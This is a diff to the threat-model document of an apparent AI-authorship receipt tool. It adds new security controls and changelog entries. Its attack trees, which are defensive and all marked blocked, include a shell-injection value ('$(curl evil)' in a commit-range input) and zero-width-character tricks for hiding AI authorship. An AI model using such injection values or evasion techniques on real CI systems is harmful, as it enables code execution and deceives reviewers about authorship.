@@ -39,7 +39,7 @@ AI authorship signals, hashes the diff, and produces a JSON receipt whose
 
 ## 2. Trust Boundaries
 
-```
+```text
 ┌───────────────────────────────────────────────────────────────────┐
 │  TB-0: Untrusted Input (attacker-controlled)                      │
 │  ┌─────────────────────────────────────────────────────────────┐  │
@@ -153,7 +153,7 @@ AI authorship signals, hashes the diff, and produces a JSON receipt whose
 
 ### 4.1 Forge a False "No AI" Receipt
 
-```
+```text
 Goal: Produce a valid receipt that says is_ai_authored=false for an AI commit
 ├── 1. Evade AI signal detection
 │   ├── 1a. Zero-width char insertion in "Copilot" → BLOCKED (R3-09 strip Cf)
@@ -175,7 +175,7 @@ workflows.
 
 ### 4.2 Inject Malicious Content via Receipt Action
 
-```
+```text
 Goal: Execute arbitrary code or exfiltrate data from the Actions runner
 ├── 1. Shell injection via commit-range input
 │   ├── 1a. $(curl evil) in INPUT_COMMIT_RANGE → BLOCKED (quoted in bash)
@@ -197,7 +197,7 @@ Goal: Execute arbitrary code or exfiltrate data from the Actions runner
 
 ### 4.3 Denial of Service
 
-```
+```text
 Goal: Make the receipt action hang or consume excessive resources
 ├── 1. Push massive commit range
 │   └── 1a. 100K commits → BLOCKED (MAX_RECEIPTS_PER_RANGE = 1000)
@@ -214,7 +214,7 @@ Goal: Make the receipt action hang or consume excessive resources
 
 ## 5. Data Flow Diagram
 
-```
+```text
                      ┌──────────────┐
                      │  Attacker /  │
                      │  Contributor │
@@ -440,7 +440,14 @@ Cross-reference of all hardening fixes applied during security review.
 | R22-SC-04 | Supply chain | Consumer verification script (`scripts/verify-pypi-provenance.py`) — stdlib-only, zero deps | T |
 | R22-SC-05 | Supply chain | Trusted Publishing OIDC — short-lived tokens, no static `PYPI_TOKEN` secret | S, T |
 
-**147 total security controls.**
+| R23-AI-01 | AI attribution | MCP server stamps `generator: "aiir.mcp"` and `agent_attestation.confidence: "transport"` — transport-level evidence that an AI client invoked the tool | T |
+| R23-AI-02 | AI attribution | CI auto-detection reads `GITHUB_ACTOR` / `GITLAB_USER_LOGIN` and auto-populates `agent_attestation.confidence: "environment"` when actor matches known AI/bot patterns | T |
+| R23-AI-03 | AI attribution | Explicit `--agent-*` CLI flags always override CI auto-detection (user intent wins) | D |
+| R23-AI-04 | AI attribution | Review receipts (`build_review_receipt`) propagate `agent_attestation` through to `extensions` | D |
+| R24-DAG-01 | Receipt integrity | `tree_sha` (directory state) included in receipt core — receipt is bound to exact tree object, preventing laundering across commits with identical diffs but different directory states | T |
+| R24-DAG-02 | Receipt integrity | `parent_shas` (DAG position) included in receipt core — receipt is bound to graph location, preventing reuse at different points in history | T |
+
+**153 total security controls.**
 
 ## 8. Fuzzing Coverage Map
 
@@ -488,6 +495,7 @@ inputs per test run**.
 | ✅ Done | PEP 740 digital attestations on every PyPI release (SLSA + Publish predicates) | Supply chain |
 | ✅ Done | PyPI Integrity API verification in CI + consumer script | Supply chain |
 | ✅ Done | SLSA provenance attestation for both wheel and sdist | Supply chain |
+| ✅ Done | Transport-level agent attestation: 3-tier confidence model (declared / transport / environment) across MCP, CLI, GitHub Action, GitLab CI | R23-AI-01–04 |
 | P1 | Add `--strict-ai-detection` mode with configurable signal list | S-02 (homoglyphs), R-01 |
 | P1 | Integrate with GitHub Artifact Attestations API for immutable provenance | R-03 |
 | P2 | Add JSON Schema validation for receipt structure (structural validation beyond existing depth check) | D-07 |
@@ -505,6 +513,5 @@ inputs per test run**.
 ## 10. Changelog
 
 | Version | Date | Changes |
-|---------|------|---------|| 3.2.0 | 2026-03-10 | PEP 740 attestations, PyPI Integrity API verification, SLSA provenance for wheel + sdist, consumer verification script; 5 new supply-chain controls (R22-SC-01–R22-SC-05); 147 total controls || 3.1.0 | 2026-03-09 | Full Unicode TR39 confusable map — 669 entries across 69 scripts (was 36 hand-curated); S-02 upgraded to Mitigated; 842 tests, 39 AI signals; hostile red-team R9 (80 adversarial tests) |
+|---------|------|---------|| 3.2.0 | 2026-03-10 | PEP 740 attestations, PyPI Integrity API verification, SLSA provenance for wheel + sdist, consumer verification script; 5 new supply-chain controls (R22-SC-01–R22-SC-05); transport-level agent attestation (R23-AI-01–R23-AI-04); DAG binding hardening: tree_sha + parent_shas in receipt core (R24-DAG-01–R24-DAG-02); 153 total controls || 3.1.0 | 2026-03-09 | Full Unicode TR39 confusable map — 669 entries across 69 scripts (was 36 hand-curated); S-02 upgraded to Mitigated; 842 tests, 39 AI signals; hostile red-team R9 (80 adversarial tests) |
 | 3.0.0 | 2026-03-07 | v1.0.0 release — 142 security controls, 504 tests, 52 fuzz tests; 36 confusable mappings, 31 AI signals; comprehensive STRIDE/DREAD analysis |
-
